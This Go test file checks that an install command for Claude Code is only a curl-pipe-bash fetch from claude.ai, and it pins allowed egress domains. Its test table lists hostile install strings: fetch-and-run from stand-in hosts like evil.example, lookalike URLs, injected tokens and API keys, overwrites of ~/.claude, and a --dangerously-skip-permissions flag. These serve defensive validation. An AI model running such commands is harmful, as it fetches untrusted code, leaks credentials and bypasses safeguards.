package claude

import (
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"slices"
	"strings"
	"testing"

	"github.com/cultofthecode/orbit/internal/policy"
)

// officialHost is the only host that the install of Claude Code may fetch
// from: the published native installer.
const officialHost = "claude.ai"

// errR04 reports an install that breaks R04.
var errR04 = errors.New("install breaks R04")

// curlFlags matches the short flags of curl that only change how it fetches:
// fail on an HTTP error, silent, show errors, follow redirects.
var curlFlags = regexp.MustCompile(`^-[fsSL]+$`)

// checkR04 accepts only the shape of the published install: curl, with
// flags that make a failed download fail, fetches one https URL on
// officialHost and pipes it into bash without arguments. Any other token is
// refused, so the install cannot fetch from another source, write into
// ~/.claude, set a variable such as a token or a key, or pass a flag to the
// installer or the client.
func checkR04(install string) error {
	stages := strings.Split(install, "|")
	if len(stages) != 2 {
		return fmt.Errorf("%w: %q is not one pipe from curl into bash", errR04, install)
	}
	if err := checkFetch(strings.Fields(stages[0])); err != nil {
		return err
	}
	if !slices.Equal(strings.Fields(stages[1]), []string{"bash"}) {
		return fmt.Errorf("%w: the installer runs as %q, want plain bash", errR04, stages[1])
	}
	return nil
}

// checkFetch accepts curl with flags that include -f and one URL on
// officialHost.
func checkFetch(fields []string) error {
	if len(fields) < 3 || fields[0] != "curl" {
		return fmt.Errorf("%w: the fetch %q is not curl with flags and a URL", errR04, fields)
	}
	flags, source := fields[1:len(fields)-1], fields[len(fields)-1]
	for _, flag := range flags {
		if !curlFlags.MatchString(flag) {
			return fmt.Errorf("%w: curl flag %q", errR04, flag)
		}
	}
	if !strings.Contains(strings.Join(flags, ""), "f") {
		return fmt.Errorf("%w: curl without -f passes a failed download to bash", errR04)
	}
	return checkSource(source)
}

// checkSource accepts an https URL on officialHost, without user, port,
// query, or fragment.
func checkSource(source string) error {
	parsed, err := url.Parse(source)
	if err != nil {
		return fmt.Errorf("%w: %w", errR04, err)
	}
	if parsed.Scheme != "https" || parsed.Host != officialHost || parsed.User != nil || parsed.RawQuery != "" || parsed.Fragment != "" {
		return fmt.Errorf("%w: the source %q is not https://%s/", errR04, source, officialHost)
	}
	return nil
}

func TestDefinitionIsNamedClaudeCode(t *testing.T) {
	if Definition.Name != "claude-code" {
		t.Errorf("Name = %q, want claude-code", Definition.Name)
	}
}

func TestInstallFollowsR04(t *testing.T) {
	if err := checkR04(Definition.Install); err != nil {
		t.Error(err)
	}
}

func TestCheckR04RefusesHostileInstalls(t *testing.T) {
	tests := []struct {
		name    string
		install string
	}{
		{name: "another host", install: "curl -fsSL https://claude.ai.evil.example/install.sh | bash"},
		{name: "a mirror", install: "curl -fsSL https://downloads.example.org/install.sh | bash"},
		{name: "plain http", install: "curl -fsSL http://claude.ai/install.sh | bash"},
		{name: "a user in the URL", install: "curl -fsSL https://claude.ai@evil.example/install.sh | bash"},
		{name: "a port", install: "curl -fsSL https://claude.ai:8443/install.sh | bash"},
		{name: "a query", install: "curl -fsSL https://claude.ai/install.sh?channel=patched | bash"},
		{name: "npm", install: "npm install -g @anthropic-ai/claude-code"},
		{name: "a second fetch", install: "curl -fsSL https://claude.ai/install.sh | bash; curl -fsSL https://evil.example/x | bash"},
		{name: "a write into ~/.claude", install: "curl -fsSL https://claude.ai/install.sh | bash && echo '{}' > ~/.claude/settings.json"},
		{name: "a token variable", install: "CLAUDE_CODE_OAUTH_TOKEN=x curl -fsSL https://claude.ai/install.sh | bash"},
		{name: "an API key for the installer", install: "curl -fsSL https://claude.ai/install.sh | ANTHROPIC_API_KEY=x bash"},
		{name: "a version argument", install: "curl -fsSL https://claude.ai/install.sh | bash -s 1.0.0"},
		{name: "a flag for the client", install: "curl -fsSL https://claude.ai/install.sh | bash -s -- --dangerously-skip-permissions"},
		{name: "curl writes a file", install: "curl -fsSL -o /home/agent/.claude.json https://claude.ai/install.sh | bash"},
		{name: "curl without -f", install: "curl -sSL https://claude.ai/install.sh | bash"},
		{name: "insecure curl", install: "curl -fsSLk https://claude.ai/install.sh | bash"},
		{name: "wget", install: "wget -qO- https://claude.ai/install.sh | bash"},
		{name: "a second line", install: "curl -fsSL https://claude.ai/install.sh | bash\nexport ANTHROPIC_API_KEY=x"},
		{name: "empty", install: ""},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if err := checkR04(test.install); !errors.Is(err, errR04) {
				t.Errorf("checkR04(%q) = %v, want %v", test.install, err, errR04)
			}
		})
	}
}

func TestEgressDomainsAreValidHosts(t *testing.T) {
	for _, domain := range Definition.EgressDomains {
		if err := policy.ValidateHost(domain); err != nil {
			t.Errorf("egress domain %q: %v", domain, err)
		}
	}
}

func TestEgressDomainsAreTheClaudeCodeHostsOfD24(t *testing.T) {
	want := []string{
		"api.anthropic.com", "browser-intake-us5-datadoghq.com", "claude.ai",
		"code.claude.com", "downloads.claude.ai", "http-intake.logs.us5.datadoghq.com",
		"mcp-proxy.anthropic.com", "platform.claude.com",
	}
	got := slices.Sorted(slices.Values(Definition.EgressDomains))
	if !slices.Equal(got, want) {
		t.Errorf("EgressDomains = %q, want %q", got, want)
	}
}
